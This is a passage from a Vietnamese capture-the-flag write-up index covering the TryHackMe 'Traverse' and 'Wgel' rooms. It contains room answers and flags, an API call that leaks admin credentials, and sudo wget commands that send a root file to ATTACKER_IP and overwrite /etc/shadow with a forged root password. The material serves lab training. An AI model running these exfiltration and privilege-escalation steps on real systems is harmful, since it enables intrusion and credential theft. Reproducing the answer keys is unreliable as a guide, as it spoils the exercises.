\u0111\u01b0\u1ee3c 2 l\u1ec7nh (xem h\u00ecnh d\u01b0\u1edbi) L\u00fac n\u00e0y l\u00e0 l\u00fac Burpsuite c\u00f3 t\u00e1c d\u1ee5ng B\u01b0\u1edbc cu\u1ed1i th\u00ec xem file th\u00f4i :3 What we learned \u00b6 Reconnaissance","title":"Traverse"},{"location":"tryhackme/room/traverse/#traverse","text":"Room at https://tryhackme.com/room/traverse List of the questions solved Question: What type of encoding is used by the hackers to obfuscate the JavaScript file? Ans: Hex Question: What is the flag value after deobfuscating the file? Ans: DIRECTORY LISTING IS THE ONLY WAY Question: Logging is an important aspect. What is the name of the file containing email dumps? Ans: email_dump.txt Question: The logs folder contains email logs and has a message for the software team lead. What is the name of the directory that Bob has created? Ans: planning Question: What is the key file for opening the directory that Bob has created for Mark? Ans: THM{100100111} Question: What is the email address for ID 5 using the leaked API endpoint? Ans: john@traverse.com Question: What is the ID for the user with admin privileges? Ans: 3 Question: What is the endpoint for logging in as the admin ? Mention the last endpoint instead of the URL. For example, if the answer is URL is tryhackme.com/admin - Just write /admin . Ans: /realadmin Question: The attacker uploaded a web shell and renamed a file used for managing the server. Can you find the name of the web shell that the attacker has uploaded? Ans: thm_shell.php Question: What is the name of the file renamed by the attacker for managing the web server? Ans: renamed_file_manager.php Question: Can you use the file manager to restore the original website by removing the \" FINALLY HACKED \" message? What is the flag value after restoring the main website? Ans: THM{WEBSITE_RESTORED}","title":"Traverse"},{"location":"tryhackme/room/traverse/#pentest-scenario","text":"Host: 10.10. 254.14 B\u00e0i n\u00e0y t\u01b0\u01a1ng \u0111\u1ed1i c\u01a1 b\u1ea3n, ch\u1ec9 c\u1ea7n traverse, traverse, traverse,... l\u00e0 tr\u1ea3 l\u1eddi \u0111\u01b0\u1ee3c h\u1ebft c\u00e1c c\u00e2u h\u1ecfi :3 Do \u0111\u00f3, writeup n\u00e0y t\u00f4i vi\u1ebft theo h\u01b0\u1edbng c\u00e1c target ch\u00ednh c\u1ea7n \u0111\u1ea1t \u0111\u01b0\u1ee3c.","title":"Pentest scenario"},{"location":"tryhackme/room/traverse/#reconnaissance","text":"Ta ch\u00fa \u00fd v\u00e0o k\u1ebft qu\u1ea3 scan c\u1ee7a gobuster v\u00e0 \u0111i l\u1ea7n l\u01b0\u1ee3t theo c\u00e1c dir, ta s\u1ebd l\u1ea5y \u0111\u01b0\u1ee3c \u0111\u00e1p \u00e1n c\u1ee7a c\u00e1c c\u00e2u h\u1ecfi Terminal /img (Status: 301) [Size: 310] [--> http://10.10.254.14/img/] /client (Status: 301) [Size: 313] [--> http://10.10.254.14/client/] /api (Status: 301) [Size: 310] [--> http://10.10.254.14/api/] /javascript (Status: 301) [Size: 317] [--> http://10.10.254.14/javascript/] /logs (Status: 301) [Size: 311] [--> http://10.10.254.14/logs/] /planning (Status: 301) [Size: 315] [--> http://10.10.254.14/planning/] /phpmyadmin (Status: 301) [Size: 317] [--> http://10.10.254.14/phpmyadmin/] V\u1ec1 ph\u1ea7n API, API Ta s\u1ebd d\u00f9ng curl \u0111\u1ec3 t\u00ecm ra \u0111\u01b0\u1ee3c th\u00f4ng tin t\u00e0i kho\u1ea3n c\u00f3 quy\u1ec1n admin Terminal curl http :// 10 . 10 . 254 . 14 / api / ? customer_id = 3 { \"data\" :{ \"id\" : \"3\" , \"name\" : \"admin\" , \"email\" : \"realadmin@traverse.com\" , \"password\" : \"admin_key!!!\" , \"timestamp\" : \"2023-05-23 04:47:25\" , \"role\" : \"admin\" , \"loginURL\" : \"\\/realadmin\" , \"isadmin\" : \"1\" }, \"response_code\" : 200 , \"response_desc\" : \"Success\" } \u0110i ti\u1ebfp, ta th\u1ea5y \u0111\u01b0\u1ee3c trang admin... Ta \u0111\u01b0\u1ee3c trang ./main.php nh\u01b0 h\u00ecnh tr\u00ean c\u00f3 t\u00e1c d\u1ee5ng th\u1ef1c thi l\u1ec7nh h\u1ec7 th\u1ed1ng nh\u01b0ng \u0111\u00e3 b\u1ecb c\u1ed1 \u0111\u1ecbnh ch\u1ec9 ch\u1ecdn \u0111\u01b0\u1ee3c 2 l\u1ec7nh (xem h\u00ecnh d\u01b0\u1edbi) L\u00fac n\u00e0y l\u00e0 l\u00fac Burpsuite c\u00f3 t\u00e1c d\u1ee5ng B\u01b0\u1edbc cu\u1ed1i th\u00ec xem file th\u00f4i :3","title":"Reconnaissance"},{"location":"tryhackme/room/traverse/#what-we-learned","text":"Reconnaissance","title":"What we learned"},{"location":"tryhackme/room/wgelctf/","tags":["THM-Room","Privilege Escalation"],"text":"CTF Wgel \u00b6 Room at https://tryhackme.com/room/wgelctf List of the questions solved Question: User flag 057c67131c3d5e42dd5cd3075b198ff6 Question: Root flag b1b968b37519ad1daa6408188649263d Pentest scenario \u00b6 Host: 10.10.157.188 \u0110\u00e2y l\u00e0 m\u1ed9t challenge thu\u1ed9c lo\u1ea1i easy nh\u01b0ng kh\u00e1 \u0111\u1ed9c \u0111\u00e1o v\u1ec1 h\u01b0\u1edbng ti\u1ebfp c\u1eadn v\u00e0 n\u00f3 kh\u00e1 hay n\u00ean t\u00f4i s\u1ebd n\u00f3i nhi\u1ec1u h\u01a1n m\u1ed9t x\u00edu Reconnaissance \u00b6 Nh\u01b0 c\u00e1c challenge kh\u00e1c, ta c\u0169ng scan m\u1ed9t v\u00e0i th\u1ee9 nh\u01b0 port, dir,... b\u1eb1ng nmap, gosbuter,... Nmap scan NULL PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Gobuster scan / sitemap ( Status : 301 ) H\u00ecnh \u1ea3nh website Website n\u00e0y \u0111\u01b0\u1ee3c build b\u1edfi WordPress v\u00e0 d\u00f9ng Colorlib template. Ta v\u00e0o website OSINT v\u00e0i th\u1ee9 th\u00ec th\u1ea5y trang Contact Us nh\u01b0 b\u00ean d\u01b0\u1edbi Contact Us Nh\u00ecn c\u00f3 v\u1ebb khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec \u0111\u00f3, nh\u01b0ng sau m\u1ed9t v\u00e0i ph\u00e9p th\u1eed input trong c\u00e1c box, v\u00e0 xem tab network th\u00ec \u0111\u00e2y ch\u1ec9 l\u00e0 1 trang v\u00f4 h\u1ea1i m\u00e0 th\u00f4i :V. \u0110i theo h\u01b0\u1edbng khai th\u00e1c n\u00e0y l\u00e0 h\u1ecfng Website n\u00e0y b\u1eaft \u0111\u1ea7u t\u1eeb sitemap, ti\u1ebfp t\u1ee5c scan ti\u1ebfp \u0110\u00e2y l\u00e0 1 website build kh\u00e1 ch\u1ec9nh chu n\u00ean scan gobuster t\u1ed1n th\u1eddi gian l\u1eafm, dirbuster cho nhanh. Dirbuster scan L\u00fac n\u00e0y m\u1edbi xu\u1ea5t hi\u1ec7n v\u1ea5n \u0111\u1ec1 :3. Ta th\u1ea5y xu\u1ea5t hi\u1ec7n kh\u00e1 nhi\u1ec1u dir nh\u01b0ng ch\u1eb3ng c\u00f3 th\u1ec3 khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec t\u1ea1i v\u00ec ch\u00ednh c\u00e1i wordlist ta th\u01b0\u1eddng d\u00f9ng kh\u00f4ng c\u00f3 database cho file hidden . Ta ph\u1ea3i d\u00f9ng wordlist kh\u00e1c (c\u00e1i n\u00e0y hay n\u00e8). Gobuster scan =============================================================== /. hta ( Status : 403 ) [ Size : 277 ] /. htaccess ( Status : 403 ) [ Size : 277 ] /. htpasswd ( Status : 403 ) [ Size : 277 ] /. ssh ( Status : 301 ) [ Size : 319 ] [--> http :// xx . xx . xxx . xxx / sitemap /. ssh /] R\u1ed3i, c\u00f3 \u0111\u01b0\u1ee3c key ssh r\u1ed3i Th\u1eed d\u00f9ng john \u0111\u1ec3 crack password nhen :3 Gi\u1edd t\u00ecm username, t\u00ecm \u0111\u00e2u ra? Ta s\u1ebd ki\u1ec3m tra sourcecode web t\u1eebng c\u00e1i, v\u00e0 username n\u00f3 n\u1eb1m \u1edf c\u00e1i website ban \u0111\u1ea7u ::) Jessie Init Access \u00b6 Login b\u1eb1ng ssh th\u00f4i ssh -i id_rsa jessie@10.10.157.188 Sudo -l R\u1ed3i ngon lu\u00f4n, \u0111\u01b0\u1ee3c c\u00e1i quy\u1ec1n sudo wget Privilege Escalation \u00b6 Th\u00f4ng th\u01b0\u1eddng g\u1eb7p leo quy\u1ec1n sudo nh\u01b0 v\u1ea7y, m\u1ecdi ng\u01b0\u1eddi s\u1ebd c\u00f3 xu h\u01b0\u1edbng l\u00ean https://gtfobins.github.io/gtfobins/wget v\u00e0 l\u1ea5y command v\u1ec1 ch\u1ea1y. Th\u00ec v\u1edbi b\u00e0i n\u00e0y, ta l\u00e0m nh\u01b0 th\u1ebf n\u00f3 kh\u00f4ng work. \u0110\u1ed1i v\u1edbi ng\u1eef c\u1ea3nh c\u1ee7a challenge tr\u00ean TryHackMe, d\u1ec5 d\u00e0ng ta bi\u1ebft \u0111\u01b0\u1ee3c file root.txt n\u1eb1m trong /root/root.txt. Do \u0111\u00f3 ta c\u00f3 th\u1ec3 l\u1ea5y \u0111\u01b0\u1ee3c file n\u00e0y d\u1ec5 d\u00e0ng b\u1eb1ng wget C\u00e1ch l\u1ea5y T\u1ea1i m\u00e1y jessie Terminal sudo wget - -post -file =/ root / root_flag . txt ATTACKER_IP : ATTACKER_PORT_LISTEN T\u1ea1i m\u00e1y attacker Terminal nc -lnvp ATTACKER_PORT_LISTEN Nh\u01b0ng c\u00e1i quan tr\u1ecdng c\u1ee7a ta l\u00e0 leo quy\u1ec1n root. Ch\u1ec9nh s\u1eeda file sudoers Some problems \u00b6 N\u00f3i v\u1ec1 vi\u1ec7c leo quy\u1ec1n v\u1edbi wget th\u00ec ta c\u00f3 nhi\u1ec1u h\u01b0\u1edbng ti\u1ebfp c\u1eadn, v\u00ec ta c\u00f3 th\u1ec3 linh \u0111\u1ed9ng trong vi\u1ec7c v\u1eadn chuy\u1ec3n v\u00e0 s\u1eeda \u0111\u1ed5i c\u00e1c file nh\u1ea1y c\u1ea3m nh\u01b0 passwd, shadow, crontab,... hay \u0111\u1eb7c bi\u1ec7t h\u01a1n l\u00e0 file sudoers. Vi\u1ec7c t\u00f4i x\u1ebfp lo\u1ea1i file passwd tr\u01b0\u1edbc file shadow nh\u01b0ng l\u1ea1i tr\u00ecnh b\u00e0y sau file shadow (2 ch\u1ec9 m\u1ee5c b\u00ean d\u01b0\u1edbi) \u0111\u1ec1u c\u00f3 \u00fd \u0111\u1ed3 c\u1ea3 \u0111\u1ea5y. B\u1ea1n th\u1eed \u0111o\u00e1n nh\u00e9. C\u00e1c \u0111\u1ecbnh ngh\u0129a b\u00ean d\u01b0\u1edbi, t\u00f4i d\u00f9ng ChatGPT gi\u1ea3i th\u00edch. /etc/shadow \u00b6 /etc/shadow l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef th\u00f4ng tin v\u1ec1 m\u1eadt kh\u1ea9u c\u1ee7a ng\u01b0\u1eddi d\u00f9ng. Kh\u00e1c v\u1edbi t\u1ec7p /etc/passwd, t\u1ec7p /etc/shadow ch\u1ee9a c\u00e1c th\u00f4ng tin v\u1ec1 m\u1eadt kh\u1ea9u \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m (hash) v\u00e0 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 x\u00e1c th\u1ef1c ng\u01b0\u1eddi d\u00f9ng khi h\u1ecd \u0111\u0103ng nh\u1eadp v\u00e0o h\u1ec7 th\u1ed1ng. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/shadow bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u hai ch\u1ea5m (\":\"): T\u00ean ng\u01b0\u1eddi d\u00f9ng (Username): T\u00ean \u0111\u0103ng nh\u1eadp duy nh\u1ea5t cho t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng. M\u1eadt kh\u1ea9u (Password): M\u1eadt kh\u1ea9u \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m (hash) v\u00e0 \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef \u1edf \u0111\u00e2y. Thay v\u00ec l\u01b0u tr\u1eef m\u1eadt kh\u1ea9u \u1edf b\u1ea3n r\u00f5, h\u1ec7 th\u1ed1ng l\u01b0u tr\u1eef m\u1ed9t gi\u00e1 tr\u1ecb b\u0103m c\u1ee7a m\u1eadt kh\u1ea9u, l\u00e0 m\u1ed9t chu\u1ed7i kh\u00f4ng th\u1ec3 \u0111\u1ea3o ng\u01b0\u1ee3c \u0111\u1ec3 kh\u00f4i ph\u1ee5c m\u1eadt kh\u1ea9u g\u1ed1c. Ng\u00e0y thay \u0111\u1ed5i m\u1eadt kh\u1ea9u cu\u1ed1i c\u00f9ng (Last Password Change): \u0110\u00e2y l\u00e0 s\u1ed1 ng\u00e0y t\u00ednh t\u1eeb ng\u00e0y 1/1/1970 (epoch) \u0111\u1ebfn ng\u00e0y thay \u0111\u1ed5i m\u1eadt kh\u1ea9u cu\u1ed1i c\u00f9ng. Th\u00f4ng tin n\u00e0y \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 ki\u1ec3m tra xem m\u1eadt kh\u1ea9u c\u00f3 c\u1ea7n ph\u1ea3i thay \u0111\u1ed5i hay kh\u00f4ng. Ng\u00e0y t\u1ed1i thi\u1ec3u \u0111\u1ec3 thay \u0111\u1ed5i m\u1eadt kh\u1ea9u ti\u1ebfp theo (Minimum Password Age): S\u1ed1 ng\u00e0y t\u1ed1i thi\u1ec3u gi\u1eefa c\u00e1c l\u1ea7n thay \u0111\u1ed5i m\u1eadt kh\u1ea9u. Ng\u00e0y t\u1ed1i \u0111a \u0111\u1ec3 thay \u0111\u1ed5i m\u1eadt kh\u1ea9u ti\u1ebfp theo (Maximum Password Age): S\u1ed1 ng\u00e0y t\u1ed1i \u0111a m\u00e0 m\u1ed9t m\u1eadt kh\u1ea9u c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i tr\u01b0\u1edbc khi ng\u01b0\u1eddi d\u00f9ng b\u1eaft bu\u1ed9c ph\u1ea3i thay \u0111\u1ed5i. S\u1ed1 ng\u00e0y c\u1ea3nh b\u00e1o tr\u01b0\u1edbc khi h\u1ebft h\u1ea1n m\u1eadt kh\u1ea9u (Password Expiry Warning): S\u1ed1 ng\u00e0y tr\u01b0\u1edbc khi m\u1eadt kh\u1ea9u h\u1ebft h\u1ea1n, ng\u01b0\u1eddi d\u00f9ng s\u1ebd \u0111\u01b0\u1ee3c c\u1ea3nh b\u00e1o. S\u1ed1 ng\u00e0y sau khi h\u1ebft h\u1ea1n m\u1eadt kh\u1ea9u m\u00e0 t\u00e0i kho\u1ea3n v\u1eabn c\u00f2n ho\u1ea1t \u0111\u1ed9ng (Account Inactivity): S\u1ed1 ng\u00e0y m\u00e0 t\u00e0i kho\u1ea3n c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i sau khi m\u1eadt kh\u1ea9u \u0111\u00e3 h\u1ebft h\u1ea1n. Ng\u00e0y h\u1ebft h\u1ea1n t\u00e0i kho\u1ea3n (Account Expiry Date): Ng\u00e0y m\u00e0 t\u00e0i kho\u1ea3n s\u1ebd h\u1ebft h\u1ea1n v\u00e0 kh\u00f4ng th\u1ec3 s\u1eed d\u1ee5ng n\u1eefa. T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a (Account Disabled): Tr\u01b0\u1eddng n\u00e0y x\u00e1c \u0111\u1ecbnh xem t\u00e0i kho\u1ea3n c\u00f3 b\u1ecb kh\u00f3a hay kh\u00f4ng. /etc/shadow \u0111\u01b0\u1ee3c b\u1ea3o v\u1ec7 c\u1ea9n th\u1eadn v\u00e0 ch\u1ec9 c\u00f3 quy\u1ec1n truy c\u1eadp h\u1ea1n ch\u1ebf cho ng\u01b0\u1eddi d\u00f9ng root ho\u1eb7c c\u00e1c qu\u1ea3n tr\u1ecb vi\u00ean h\u1ec7 th\u1ed1ng. \u0110i\u1ec1u n\u00e0y gi\u00fap b\u1ea3o v\u1ec7 th\u00f4ng tin m\u1eadt kh\u1ea9u c\u1ee7a ng\u01b0\u1eddi d\u00f9ng kh\u1ecfi vi\u1ec7c truy c\u1eadp tr\u00e1i ph\u00e9p. Tuy ta kh\u00f4ng c\u00f3 quy\u1ec1n xem file /etc/shadow nh\u01b0ng ta l\u1ea1i c\u00f3 quy\u1ec1n sudo wget. Do \u0111\u00f3, ta c\u00f3 th\u1ec3 d\u00f9ng wget \u0111\u1ec3 t\u1ea1o k\u1ebft n\u1ed1i nh\u1eb1m d\u00f9ng john \u0111\u1ec3 t\u00ecm password c\u1ee7a root trong file /etc/shadow nh\u01b0ng h\u01b0\u1edbng n\u00e0y bruteforce kh\u00f4ng ra password, n\u00ean t\u00f4i kh\u00f4ng \u0111\u1ec3 v\u00e0o ng\u1eef c\u1ea3nh tri\u1ec3n khai. Th\u1ef1c ra h\u01b0\u1edbng n\u00e0y ta c\u00f3 th\u1ec3 \u0111o\u00e1n t\u1eeb \u0111\u1ea7u l\u00e0 kh\u00f4ng th\u1ec3 k\u1ec3 t\u1eeb l\u00fac bruteforce kh\u00f4ng ra password t\u1eeb id_rsa key r\u1ed3i. Nh\u01b0ng m\u00e0 khoan, ta c\u00f3 th\u1ec3 c\u00e0i \u0111\u1eb7t password m\u1edbi cho root m\u00e0, \u0111\u00fang kh\u00f4ng? script.py Script t\u1ea1o password abc cho root import crypt crypt . crypt ( 'abc' ) output: $6$Datncmm.PBBQkKys$5WA2bUtuR6eEXngZIQDMKSXZ8woGOWeXn85GeoCexca8FOapBGA5HKAGRlhkm3P.qrd5bMwgvJazlBAli5rWo1 Oke gi\u1edd ta s\u1ebd t\u1ea1o cho root password l\u00e0 abc v\u00e0 ghi v\u00e0o file shadow shadow V\u1eadn chuy\u1ec3n file shadow \u0111\u1ebfn m\u00e1y jessie C\u00e1ch v\u1eadn chuy\u1ec3n T\u1ea1i m\u00e1y attacker Terminal python3 -m http . server T\u1ea1i m\u00e1y jessie Terminal sudo wget ATTACKER_IP : ATTACKER_PORT_LISTEN / shadow - -output-document = shadow /etc/passwd \u00b6 /etc/passwd l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef th\u00f4ng tin t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng: Trong qu\u00e1 kh\u1ee9 , n\u00f3 th\u01b0\u1eddng ch\u1ee9a th\u00f4ng tin c\u01a1 b\u1ea3n v\u1ec1 c\u00e1c t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng tr\u00ean h\u1ec7 th\u1ed1ng. Hi\u1ec7n nay n\u00f3 th\u01b0\u1eddng ch\u1ec9 ch\u1ee9a m\u1ed9t lo\u1ea1t c\u00e1c m\u1ee5c th\u1ec3 hi\u1ec7n th\u00f4ng tin ng\u01b0\u1eddi d\u00f9ng. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/passwd bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u hai ch\u1ea5m (\":\"): T\u00ean ng\u01b0\u1eddi d\u00f9ng (Username): \u0110\u00e2y l\u00e0 t\u00ean \u0111\u0103ng nh\u1eadp duy nh\u1ea5t cho t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng. M\u1eadt kh\u1ea9u (Password): Trong qu\u00e1 kh\u1ee9 , m\u1eadt kh\u1ea9u th\u01b0\u1eddng \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef \u1edf \u0111\u00e2y d\u01b0\u1edbi d\u1ea1ng b\u0103m (hash). Hi\u1ec7n nay, h\u1ea7u h\u1ebft c\u00e1c h\u1ec7 th\u1ed1ng s\u1eed d\u1ee5ng c\u00e1c c\u01a1 ch\u1ebf b\u1ea3o m\u1eadt kh\u00e1c \u0111\u1ec3 l\u01b0u tr\u1eef m\u1eadt kh\u1ea9u, v\u00e0 tr\u01b0\u1eddng n\u00e0y th\u01b0\u1eddng ch\u1ec9 ch\u1ee9a m\u1ed9t d\u1ea5u \"x\" ho\u1eb7c m\u1ed9t k\u00fd t\u1ef1 ng\u1eabu nhi\u00ean. \u0110i\u1ec1u quan tr\u1ecdng h\u01a1n h\u1ebft l\u00e0 password hi\u1ec7n nay s\u1ebd l\u01b0u t\u1ea1i /etc/shadow. User ID (UID): \u0110\u00e2y l\u00e0 m\u1ed9t s\u1ed1 duy nh\u1ea5t \u0111\u01b0\u1ee3c g\u00e1n cho m\u1ed7i ng\u01b0\u1eddi d\u00f9ng tr\u00ean h\u1ec7 th\u1ed1ng. Group ID (GID): \u0110\u00e2y l\u00e0 s\u1ed1 nh\u00f3m ch\u1ee9a ng\u01b0\u1eddi d\u00f9ng, th\u01b0\u1eddng l\u00e0 m\u1ed9t nh\u00f3m m\u1eb7c \u0111\u1ecbnh. Th\u00f4ng tin v\u1ec1 ng\u01b0\u1eddi d\u00f9ng (User Info): M\u00f4 t\u1ea3 th\u00eam v\u1ec1 ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c t\u00e0i kho\u1ea3n. Th\u01b0 m\u1ee5c nh\u00e0 (Home Directory): \u0110\u00e2y l\u00e0 th\u01b0 m\u1ee5c m\u00e0 ng\u01b0\u1eddi d\u00f9ng s\u1ebd truy c\u1eadp khi \u0111\u0103ng nh\u1eadp. Shell: \u0110\u00e2y l\u00e0 ch\u01b0\u01a1ng tr\u00ecnh d\u00f2ng l\u1ec7nh m\u00e0 ng\u01b0\u1eddi d\u00f9ng s\u1eed d\u1ee5ng khi \u0111\u0103ng nh\u1eadp. Tuy nhi\u00ean, \u0111i\u1ec1u quan tr\u1ecdng c\u1ea7n l\u01b0u \u00fd l\u00e0 v\u1edbi c\u00e1c phi\u00ean b\u1ea3n h\u1ec7 \u0111i\u1ec1u h\u00e0nh hi\u1ec7n \u0111\u1ea1i, th\u00f4ng tin t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng th\u01b0\u1eddng kh\u00f4ng \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef tr\u1ef1c ti\u1ebfp trong t\u1ec7p /etc/passwd n\u1eefa v\u00ec l\u00fd do b\u1ea3o m\u1eadt. Thay v\u00e0o \u0111\u00f3, th\u00f4ng tin t\u00e0i kho\u1ea3n th\u01b0\u1eddng \u0111\u01b0\u1ee3c qu\u1ea3n l\u00fd b\u1edfi c\u00e1c c\u01a1 ch\u1ebf qu\u1ea3n l\u00fd t\u00e0i kho\u1ea3n v\u00e0 b\u1ea3o m\u1eadt h\u1ec7 th\u1ed1ng kh\u00e1c (/etc/shadow). Ch\u00ednh v\u00ec nh\u1eefng l\u00fd gi\u1ea3i tr\u00ean, v\u1ec1 m\u1eb7t b\u1ea3n ch\u1ea5t file /etc/passwd v\u1eabn c\u00f3 th\u1ec3 l\u01b0u password t\u00e0i kho\u1ea3n \u0111\u01b0\u1ee3c (thay th\u1ebf v\u1ecb tr\u00ed \"x\" trong file). N\u00ean ta c\u00f3 th\u1ec3 ghi tr\u1ef1c ti\u1ebfp password v\u00e0o file n\u00e0y. \"/etc/shadow l\u00e0m \u0111\u01b0\u1ee3c th\u00ec /etc/passwd l\u00e0m \u0111\u01b0\u1ee3c\" passwd /etc/crontab \u00b6 T\u1ec7p /etc/crontab l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u1ec3 \u0111\u1ecbnh l\u1ecbch ch\u1ea1y c\u00e1c t\u00e1c v\u1ee5 \u0111\u1ecbnh k\u1ef3 t\u1ef1 \u0111\u1ed9ng (cron jobs). Cron jobs l\u00e0 c\u00e1c t\u00e1c v\u1ee5 \u0111\u01b0\u1ee3c l\u00ean l\u1ecbch \u0111\u1ec3 th\u1ef1c hi\u1ec7n m\u1ed9t c\u00e1ch t\u1ef1 \u0111\u1ed9ng v\u00e0o c\u00e1c th\u1eddi \u0111i\u1ec3m c\u1ee5 th\u1ec3, v\u00ed d\u1ee5 nh\u01b0 h\u00e0ng ng\u00e0y, h\u00e0ng tu\u1ea7n, ho\u1eb7c m\u1ed7i gi\u1edd. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/crontab th\u01b0\u1eddng bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u c\u00e1ch: Ph\u00fat (Minute): Ph\u00fat c\u1ee5 th\u1ec3 trong m\u1ed7i gi\u1edd m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 59). Gi\u1edd (Hour): Gi\u1edd c\u1ee5 th\u1ec3 trong ng\u00e0y m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 23). Ng\u00e0y trong th\u00e1ng (Day of Month): Ng\u00e0y trong th\u00e1ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 1 \u0111\u1ebfn 31). Th\u00e1ng (Month): Th\u00e1ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 1 \u0111\u1ebfn 12 ho\u1eb7c c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng t\u00ean th\u00e1ng). Ng\u00e0y trong tu\u1ea7n (Day of Week): Ng\u00e0y trong tu\u1ea7n m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 6, v\u1edbi 0 l\u00e0 Ch\u1ee7 Nh\u1eadt). Ng\u01b0\u1eddi d\u00f9ng (User): T\u00ean ng\u01b0\u1eddi d\u00f9ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n d\u01b0\u1edbi quy\u1ec1n c\u1ee7a. \u0110\u00e2y l\u00e0 t\u00f9y ch\u1ecdn, n\u1ebfu kh\u00f4ng c\u00f3, t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n d\u01b0\u1edbi quy\u1ec1n ng\u01b0\u1eddi d\u00f9ng root. L\u1ec7nh (Command): L\u1ec7nh c\u1ee5 th\u1ec3 m\u00e0 b\u1ea1n mu\u1ed1n th\u1ef1c hi\u1ec7n trong t\u00e1c v\u1ee5 cron. T\u1ec7p /etc/crontab th\u01b0\u1eddng ch\u1ec9 \u0111\u01b0\u1ee3c s\u1eeda \u0111\u1ed5i b\u1edfi ng\u01b0\u1eddi d\u00f9ng c\u00f3 quy\u1ec1n qu\u1ea3n tr\u1ecb (root) v\u00e0 ch\u1ee9a c\u00e1c t\u00e1c v\u1ee5 \u0111\u01b0\u1ee3c x\u00e1c \u0111\u1ecbnh b\u1edfi h\u1ec7 th\u1ed1ng ho\u1eb7c qu\u1ea3n tr\u1ecb vi\u00ean h\u1ec7 th\u1ed1ng \u0111\u1ec3 t\u1ef1 \u0111\u1ed9ng th\u1ef1c hi\u1ec7n c\u00e1c t\u00e1c v\u1ee5 nh\u01b0 sao l\u01b0u d\u1eef li\u1ec7u, c\u1eadp nh\u1eadt h\u1ec7 th\u1ed1ng, ho\u1eb7c th\u1ef1c hi\u1ec7n c\u00e1c t\u00e1c v\u1ee5 \u0111\u1ecbnh k\u1ef3 kh\u00e1c. /etc/crontab V\u1ec1 ph\u1ea7n crontab ta c\u00f3 th\u1ec3 schedule b\u1ea5t k\u00ec \u0111i\u1ec1u g\u00ec. V\u00ed d\u1ee5 nh\u01b0 l\u00e0 m\u1edf revershell \u0111\u1ec3 chi\u1ebfm quy\u1ec1n admin,... D\u00f9ng l\u1ec7nh systemctl status cron \u0111\u1ec3 xem status cron \u00dd t\u01b0\u1edfng t\u00f4i mu\u1ed1n th\u1ef1c hi\u1ec7n cronjob \u1edf \u0111\u00e2y l\u00e0 ghi v\u00e0o file sudoers, th\u00ec \u00fd t\u01b0\u1edfng n\u00e0y t\u00f4i \u0111\u00e3 tri\u1ec3n khai \u1edf d\u01b0\u1edbi ph\u1ea7n /etc/sudoers B\u1ea1n c\u00f3 th\u1ec3 xem th\u00eam t\u1ea1i \u0111\u00e2y /etc/sudoers \u00b6 T\u1ec7p /etc/sudoers l\u00e0 m\u1ed9t t\u1ec7p c\u1ea5u h\u00ecnh quan 